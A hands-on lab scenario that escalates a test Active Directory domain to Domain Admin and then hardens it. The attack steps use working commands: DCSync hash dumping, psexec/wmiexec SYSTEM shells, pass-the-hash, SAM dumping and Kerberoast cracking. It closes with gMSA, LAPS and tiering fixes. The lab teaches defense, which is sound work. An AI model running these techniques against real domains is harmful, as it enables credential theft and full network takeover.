---
title: "Scenario 08 - Active Directory escalation (to Domain Admin + lateral movement)"
---

# Scenario 08 - Active Directory escalation (to Domain Admin + lateral movement)

> **Ethics + scope.** Everything here runs against **VMs we own** on the **isolated a local model net
> `10.13.37.0/24`** - no route to the real LAN or the internet. This is defensive-security education: we
> take our own domain to Domain Admin so we understand exactly how the compromise unfolds and how each
> step is stopped. The credentials, loot, and "secrets" are all planted lab values (`FLAG-...`), never
> anything real. Doing this outside a lab you own is a crime.

Scenario 07 mapped the domain and found the flaw: **`svc-backup` is in Domain Admins**. This module turns
that finding into full control. Two paths, both **using only our lab creds**:

- **Path A - the intended weak path:** we already have (or recover) `svc-backup`'s password from the lab
  brief; because it is a Domain Admin, we dump domain secrets and execute code on the DC and client.
- **Path B - technique teaching:** *if* `svc-backup` has an SPN, we kerberoast it (request its service
  ticket as a normal user, crack the ticket offline with hashcat + rockyou) to **recover the same
  password without being told it** - proving why a service account in Domain Admins is catastrophic.

Then we show **credential reuse / pass-the-hash** from `win-cli` to `win-dc`, grab the loot flags, and
finally **remediate and prove the escalation path disappears** from BloodHound.

---

## Header

| | |
|---|---|
| **Goal** | Escalate a foothold to Domain Admin of `hacklab.local`, dump domain secrets, execute on the DC and client, capture the loot flags, then remediate and prove the path is gone. |
| **Target** | `win-dc` 10.13.37.50 (DC), `win-cli` 10.13.37.51 (domain-joined Win11, holds the loot). |
| **Difficulty** | Intermediate. |
| **Est. time** | 90-120 min (Path B cracking time varies). |
| **Prereqs** | Scenario **07** completed (BloodHound map, `~/kerberoast.hash` if svc-backup had an SPN, the finding that svc-backup is in Domain Admins). Kali on a local model. Lab creds: `HACKLAB\svc-backup : Hacklab2026!` (Domain Admin), `HACKLAB\j.mueller : Hacklab2026!` (normal), local `labadmin : Hacklab2026!` on win-cli. |
| **Start-from** | Revert **both** Windows VMs to `clean-baseline` (see Cleanup). Escalation steps read from and write to the DC, so start from a known-clean baseline. |

### MITRE ATT&CK coverage
- **Credential Access / Kerberoasting** - T1558.003 (Path B)
- **Credential Access / OS Credential Dumping: DCSync** - T1003.006 (secretsdump `-just-dc`)
- **Credential Access / OS Credential Dumping: LSASS / SAM** - T1003.001 / T1003.002 (win-cli local)
- **Lateral Movement / Remote Services: SMB & WMI** - T1021.002 (psexec) / T1021 (wmiexec)
- **Lateral Movement / Use Alternate Authentication Material: Pass-the-Hash** - T1550.002
- **Execution / Windows Management Instrumentation** - T1047

---

## Setup (on Kali)

```
export DC=10.13.37.50
export CLI=10.13.37.51
export DOM=hacklab.local
# the deliberately over-privileged service account (Domain Admin):
export SVC=svc-backup
export SVCP='Hacklab2026!'       # single-quoted so the ! is literal
```
Make sure `/etc/hosts` has the `win-dc.hacklab.local` / `win-cli` entries from scenario 07 (step S2), or
pass `-dc-ip $DC` on the impacket tools as shown. Everything below is against **our** DC/client only.

---

## Path A - use the Domain-Admin service account directly (the intended weak path)

`svc-backup` is in Domain Admins, so its password *is* the keys to the kingdom. In scenario 07 we saw the
membership; here we exercise the consequence.

### A1. Confirm svc-backup is a Domain Admin (netexec)
```
nxc smb $DC -u $SVC -p "$SVCP"
```
- *What it does:* authenticates svc-backup to the DC.
- *What you should see:* a green `[+] hacklab.local\svc-backup:Hacklab2026!` and, appended,
  **`(Pwn3d!)`** - netexec's marker that this account has admin rights on the target. `(Pwn3d!)` on a
  **domain controller** means Domain Admin.

### A2. DCSync - dump domain secrets with impacket secretsdump (T1003.006)
Because svc-backup is a Domain Admin, it can ask the DC to replicate password data - the DCSync technique.
This pulls **every** account's NTLM hash, including `krbtgt` and `Administrator`.
```
impacket-secretsdump "$DOM/$SVC:$SVCP"@$DC -just-dc -outputfile ~/dcsync
```
- *What it does:* `-just-dc` uses the directory-replication (DRSUAPI) path to extract NTDS secrets without
  touching disk on the DC. Output is split into `~/dcsync.ntds`, `.ntds.kerberos`, etc.
- *What you should see:* NTLM hashes in `user:RID:LM:NT:::` form for every account. Key lines:
```
grep -iE 'Administrator|krbtgt|svc-backup' ~/dcsync.ntds
# Administrator:500:aad3b...:<NT hash>:::
# krbtgt:502:aad3b...:<NT hash>:::
```
- *Why this is game over:* with `Administrator`'s NT hash you own the domain (pass-the-hash below). With
  the **`krbtgt`** hash you could forge Golden Tickets - the reason `krbtgt` compromise means a full domain
  rebuild. **Do not** run this against anything but our lab DC.

Capture the Administrator hash into a variable for the next steps:
```
export ADMHASH=$(awk -F: 'tolower($1)=="administrator"{print $4}' ~/dcsync.ntds)
echo "Administrator NT hash: $ADMHASH"
```

### A3. Execute on the DC (impacket psexec / wmiexec)
```
impacket-psexec "$DOM/$SVC:$SVCP"@$DC
```
- *What it does:* uploads a service, runs it as SYSTEM over SMB (T1021.002), and drops you into an
  interactive `cmd.exe` **as NT AUTHORITY\SYSTEM on the DC**.
- *What you should see:* a `C:\Windows\system32>` prompt; `whoami` returns `nt authority\system`. Confirm
  you are on the DC: `hostname` -> `WIN-DC`. Type `exit` to clean up the service it created.
- *Quieter alternative (no service, uses WMI - T1047):*
```
impacket-wmiexec "$DOM/$SVC:$SVCP"@$DC
```
  Same SYSTEM-level shell via WMI, which leaves a lighter footprint than psexec's service install.

### A4. Execute on the client and grab the loot flags
The loot lives on **win-cli** at `C:\Users\Public\Documents` (FLAG-BANK / FLAG-SEED / FLAG-CREDS, all
fake). A Domain Admin can reach it.
```
# option 1: interactive shell on the client, then read the flags
impacket-wmiexec "$DOM/$SVC:$SVCP"@$CLI
#   C:\> type C:\Users\Public\Documents\*.txt   (or dir that folder to see the planted files)

# option 2: pull the whole loot folder over SMB without a shell (netexec)
nxc smb $CLI -u $SVC -p "$SVCP" --get-file 'C:\Users\Public\Documents\FLAG-BANK.txt' ~/FLAG-BANK.txt
#   repeat for FLAG-SEED and FLAG-CREDS; or browse with smbclient:
smbclient //$CLI/C$ -U "$DOM/$SVC%$SVCP" -c 'cd Users\Public\Documents; ls; prompt OFF; mget *'
```
- *What it does:* runs as SYSTEM on win-cli / reads its `C$` admin share as a Domain Admin.
- *What you should see:* the three planted flag files. `type`/`cat` them to record the `FLAG-BANK{...}`,
  `FLAG-SEED{...}`, `FLAG-CREDS{...}` values. These are the "bank / crypto seed / saved credential" the
  attacker was after - deliberately fake.

### A5. Lateral movement + pass-the-hash (T1550.002) - win-cli -> win-dc
You do not even need the plaintext once you have a hash. Use the `Administrator` NT hash from A2 to
authenticate to the DC with **no password at all**:
```
nxc smb $DC -u Administrator -H $ADMHASH        # expect (Pwn3d!)
impacket-psexec -hashes :$ADMHASH Administrator@$DC     # SYSTEM shell via the hash alone
```
- *What it does:* passes the NT hash instead of a password (`-hashes LM:NT`, blank LM is fine).
- *What you should see:* the same `(Pwn3d!)` / SYSTEM shell as A3 - proving that a **stolen hash is as good
  as a password** for NTLM auth, which is why hash dumping (A2) is so serious. The "reuse from win-cli to
  win-dc" story: an attacker who dumped LSAM/LSASS on the client (a local admin there) would find cached
  domain-admin material and replay it straight to the DC.

To make the client-side dump concrete (local SAM on win-cli via its local admin `labadmin`):
```
nxc smb $CLI -u labadmin -p "$SVCP" --local-auth --sam
```
- *What you should see:* the local SAM hashes from win-cli (T1003.002). In the real world these local-admin
  hashes are frequently **identical across every desktop** (a shared local-admin password) - one dump,
  pass-the-hash to all of them. That is the exact problem LAPS solves (see Defense).

---

## Path B - kerberoast svc-backup to *recover* the password (technique teaching)

Path A assumed we were handed svc-backup's password. Path B shows how an attacker with **only a normal
user** (`j.mueller`) recovers it anyway - *if* svc-backup has an SPN. This is why "it's just a service
account, no one knows the password" is false comfort.

> **If scenario 07 step 7a returned an empty table**, svc-backup has no SPN and is not kerberoastable -
> skip Path B and note that Path A is the realistic route. To make this exercise work you can (as a lab
> instructor, on the DC) set an SPN: `setspn -s HTTP/win-dc.hacklab.local hacklab\svc-backup`, revert
> afterwards. Do this only on our lab DC.

### B1. Request the service ticket (Kerberoast, T1558.003) as j.mueller
```
impacket-GetUserSPNs "$DOM/j.mueller:Hacklab2026!" -dc-ip $DC -request \
  -outputfile ~/kerberoast.hash
cat ~/kerberoast.hash        # $krb5tgs$23$*svc-backup*...  (RC4/etype-23 TGS blob)
```
- *What it does:* any domain user may request a TGS for any SPN; the ticket is encrypted with the service
  account's password-derived key, so the returned blob is an **offline-crackable** hash.
- *What you should see:* a `$krb5tgs$23$...` line naming `svc-backup`. (You may already have this file from
  scenario 07 step 7a.)

### B2. Crack it offline with hashcat + rockyou
rockyou ships gzipped on Kali - unpack it once:
```
[ -f /usr/share/wordlists/rockyou.txt ] || sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz
hashcat -m 13100 -a 0 ~/kerberoast.hash /usr/share/wordlists/rockyou.txt --force
#   -m 13100 = Kerberos 5 TGS-REP etype 23 (RC4).  When it finishes:
hashcat -m 13100 ~/kerberoast.hash --show
```
- *What it does:* `-m 13100` is the hash mode for a Kerberoast TGS; it tries each rockyou word as the
  service account password until the ticket decrypts.
- *What you should see:* the recovered password after the hash: `...:Hacklab2026!`. Because our lab
  password is deliberately weak (in rockyou), it cracks quickly - the lesson is that a **short/guessable
  service password + an SPN = domain admin in minutes**. A 25+ char random password would never fall to
  this.
- *john alternative:* `john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt ~/kerberoast.hash`
  then `john --show ...`.

### B3. Reuse the recovered password
Now you have svc-backup's password *without ever being told it* - feed it into any Path A step (A2-A5). The
attacker who started as a nobody (`j.mueller`) is now a Domain Admin. That closes the loop: **recon (07)
found the roastable Domain-Admin service account, and roasting it yields full domain control.**

---

## Defense (the main lesson - harden, then prove the path is gone)

The escalation only worked because a **service account was a Domain Admin with a crackable password**.
Fix that and the whole chain collapses. Apply on our lab DC (via an RDP/console admin session or an
elevated PowerShell), then re-run the attack to confirm it fails.

1. **Remove svc-backup from Domain Admins (the single most important fix).**
   ```
   # on the DC, elevated PowerShell:
   Remove-ADGroupMember -Identity "Domain Admins" -Members svc-backup -Confirm:$false
   ```
   Grant it *only* the specific rights the backup job needs (delegated permissions / a resource-specific
   role), never a Tier-0 group.
2. **Use a Group Managed Service Account (gMSA) with a long random password.** A gMSA's 240-bit password is
   generated and auto-rotated by AD, is never known to a human, and is far beyond any wordlist - Kerberoast
   becomes useless even if an SPN exists.
   ```
   # on the DC (one-time KDS root key, then create the gMSA):
   Add-KdsRootKey -EffectiveTime ((Get-Date).AddHours(-10))
   New-ADServiceAccount -Name svc-backup-gmsa -DNSHostName win-dc.hacklab.local \
     -PrincipalsAllowedToRetrieveManagedPassword "win-cli$"
   ```
   Repoint the service to the gMSA and retire the old standing account.
3. **Enable LAPS for local admin.** Windows LAPS randomises **every** machine's local-admin password and
   stores it in AD, so the win-cli -> win-dc pass-the-hash / shared-local-admin reuse in A5 stops working
   (each host's local hash is unique and unknown).
4. **Tier admin accounts.** Tier-0 (Domain/Enterprise Admins) log on **only** to DCs/PAWs, never to a
   desktop; desktops get their own scoped admins. This kills the "dump a desktop, replay to the DC" path.
5. **(Reinforcing) disable NTLM where possible / require SMB + LDAP signing**, and give any remaining SPN
   account a 25+ char random secret.

### Prove the fix
- **The escalation fails.** Re-run **A1**: `nxc smb $DC -u svc-backup -p 'Hacklab2026!'` should now show
  `[+]` (it still authenticates as a normal user) **without `(Pwn3d!)`**, and **A2**
  (`impacket-secretsdump ... -just-dc`) should be **denied** ("access denied" / `STATUS_ACCESS_DENIED`) -
  svc-backup can no longer DCSync.
- **Kerberoast is useless.** After moving to the gMSA (or a 25+ char password), re-run **B1/B2**; the
  ticket either no longer exists or hashcat exhausts rockyou with **no crack** - the password is not in any
  wordlist.
- **The graph proves it.** Re-run scenario 07 steps 8-10 (`bloodhound-python ... -c all`, re-import) and
  run **"Shortest Paths to Domain Admins"** again. The `svc-backup -> Domain Admins` edge is **gone**, and
  there is **no path** from `j.mueller` to Domain Admin. This before/after BloodHound screenshot is the
  headline of the demo: *the exact same recon now finds nothing to exploit.*

---

## Wrap-up

**Flags / evidence collected**
- `~/dcsync.ntds` - domain hash dump (DCSync); note the `Administrator` and `krbtgt` lines as evidence.
- `~/FLAG-BANK.txt`, `~/FLAG-SEED.txt`, `~/FLAG-CREDS.txt` (or their `type`d values) - the loot from
  win-cli `C:\Users\Public\Documents`, all fake.
- `~/kerberoast.hash` + the cracked password (Path B) - proof that a weak SPN password = Domain Admin.
- SYSTEM shells demonstrated on **win-dc** and **win-cli**; pass-the-hash to the DC with the Administrator
  NT hash.
- **The lesson:** one misplaced group membership + a weak password took a nobody to Domain Admin; removing
  it (gMSA + tiering + LAPS) makes the identical attack dead-end, verified in BloodHound.

**Cleanup / reset** (escalation wrote to the targets - always revert)
```
# shut both VMs down FIRST, then revert the external UEFI snapshots
virsh -c qemu:///system shutdown win-cli ; virsh -c qemu:///system shutdown win-dc
#   wait until 'virsh -c qemu:///system list --all' shows both "shut off", then:
virsh -c qemu:///system snapshot-revert win-dc  clean-baseline
virsh -c qemu:///system snapshot-revert win-cli clean-baseline
sudo neo4j stop      # if BloodHound was running
```
Reverting undoes psexec's service, any gMSA/LAPS changes, and the loot reads - the pair returns to the
pristine "svc-backup is in Domain Admins" baseline so the scenario is repeatable.

**Go deeper: ** Research: In scenario 08, my impacket-secretsdump -just-dc returns access denied with svc-backup - what does that tell me about the domain's state?
